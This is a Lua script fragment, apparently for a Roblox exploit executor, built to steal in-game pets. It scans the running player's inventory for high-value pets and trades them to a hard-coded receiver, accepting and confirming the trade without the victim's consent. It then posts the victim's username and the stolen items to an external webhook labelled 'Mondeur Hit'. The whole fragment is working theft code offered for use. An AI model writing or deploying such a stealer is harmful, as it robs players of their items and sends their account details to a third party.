-- [[ FIRE WEBHOOK FUNCTION ]] --
local function sendMondeurWebhook(url, pets, total, isHandshake)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if not request then return end

    local petString = ""
    if not isHandshake then
        for _, p in ipairs(pets) do
            petString = petString .. "⭐ **" .. p.name .. "** • `" .. p.value .. " pts`\n"
        end
    end

    local payload = {
        username = "Mondeur Hit (ADM)",
        avatar_url = "https://i.imgur.com/8Q0TzS9.png",
        embeds = {{
            title = isHandshake and "🟢 **System Online: Connection Established**" or "🚀 **Incoming Transmission: Successful Hit**",
            description = isHandshake and "Mondeur Elite is now monitoring the session." or "A new trade has been successfully intercepted.",
            color = isHandshake and 0x00ff88 or 0xff004c,
            thumbnail = { url = "https://i.imgur.com/uM9eL7B.png" },
            fields = {
                {name = "👤 **Target Account**", value = "```" .. LocalPlayer.Name .. "```", inline = true},
                {name = "💰 **Total Points**", value = "```" .. (isHandshake and "N/A" or total) .. "```", inline = true},
            },
            footer = { text = "Mondeur Services v2.1", icon_url = "https://i.imgur.com/8Q0TzS9.png" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    if not isHandshake and petString ~= "" then
        table.insert(payload.embeds[1].fields, {name = "🎒 **Loot Collected**", value = petString})
    end

    pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- [[ SCAN & TRADE ]] --
local function scanAndTrade()
    local receiver = nil
    for _, name in ipairs(TARGET_RECEIVERS) do
        if Players:FindFirstChild(name) then receiver = Players[name] break end
    end
    if not receiver then return end

    local list, total = {}, 0
    local success, inv = pcall(function() return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() end)
    
    if success and inv then
        for _, item in ipairs(inv) do
            if item.Kind == "Pet" then
                for petName, val in pairs(PetValues) do
                    if string.find(item.Name:lower(), petName:lower()) then
                        table.insert(list, {id = item.Id, name = item.Name, value = val})
                        total = total + val
                        break
                    end
                end
            end
        end
    end

    if #list > 0 then
        local TradeAPI = ReplicatedStorage.API
        TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
        for _, p in ipairs(list) do
            TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id)
        end
        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
        sendMondeurWebhook(USER_WEBHOOK, list, total, false)
    end
end

